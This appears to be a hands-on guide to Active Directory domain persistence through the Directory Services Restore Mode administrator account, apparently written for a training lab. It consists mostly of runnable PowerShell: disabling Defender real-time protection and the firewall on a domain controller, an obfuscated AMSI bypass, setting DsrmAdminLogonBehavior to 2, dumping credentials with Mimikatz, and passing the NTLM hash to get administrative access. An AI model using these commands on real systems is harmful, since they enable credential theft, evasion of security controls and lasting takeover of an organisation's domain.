# Directory Services Restore Mode (DSRM)

There is a local administrator on every DC called "Administrator" whose password is the DSRM password. The DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

This is domain persistent, and you should have domain admin rights. We are going to use an account that has domain admin access.

# Prerequisites for Performing the Attack

| Prerequisite              | Details                                                                 |
|-------------------------|-------------------------------------------------------------------------|
| **Domain Admin Rights** | Required to execute commands and make necessary changes on the DC.     |
| **DSRM Password**       | The Directory Services Restore Mode (DSRM) password for the local administrator account on the DC. |
| **Tools**                | - PowerShell<br>- Mimikatz<br>- Required scripts (e.g., Invoke-mimikatz.ps1) |
| **Access to DC**         | Capability to create sessions with the Domain Controller and perform remote commands. |
| **Privilege Escalation** | Ability to disable security measures (like Firewall and AV) and modify registry keys. |
| **NTLM Hash**            | The NTLM hash of the local administrator account on the DC to pass the hash for authentication. |

Ensure all the above prerequisites are met before attempting to perform the attack.

## From the Domain Admin PowerShell Permission

### Create Session
```powershell
$sess = New-PSSession -ComputerName dc
```

### Disable Firewall and AV
```powershell
Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess
Invoke-Command -Session $sess -FilePath c:\AD\Tools\Invoke-mimikatz.ps1
```

### Bypass AMSI
```powershell
powershell -ep bypass
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

### Enter Session
```powershell
Enter-PSSession $sess
```
![image](https://github.com/user-attachments/assets/1248be74-9907-4dd4-9a6f-5007b87bf4f7)

### Enter New Registry Key
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

### If Registry Key Exists

#### Check if DsrmAdminLogonBehavior is set to 2
```powershell
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
```

#### If DsrmAdminLogonBehavior is not set to 2
```powershell
Set-ItemProperty -Name "DsrmAdminLogonBehavior" -Value 2
```

#### Check if DsrmAdminLogonBehavior is set to 2 again
```powershell
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
```
![image](https://github.com/user-attachments/assets/33788f38-2c52-4229-88d2-a1e2e0a5231e)

### Compare the Administrator Hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc
```
![image](https://github.com/user-attachments/assets/b8b581cf-5232-487b-8dea-da22591114d9)

### Dump DSRM Password (Needs DA Privileges) to be used for the command below
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc
```

### Use the Command Below to Pass the Hash (Use the Hash from the Above Command)
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:216879snip… /run:powershell.exe"'
```

### Create Session
```powershell
$sess = New-PSSession -ComputerName dc
Enter-PSSession $sess
```

### Or Access the Target Service
```powershell
ls \\dcorp-dc\c$
```
![image](https://github.com/user-attachments/assets/bf50a60d-4102-43b4-b300-3b573caee47c)

```
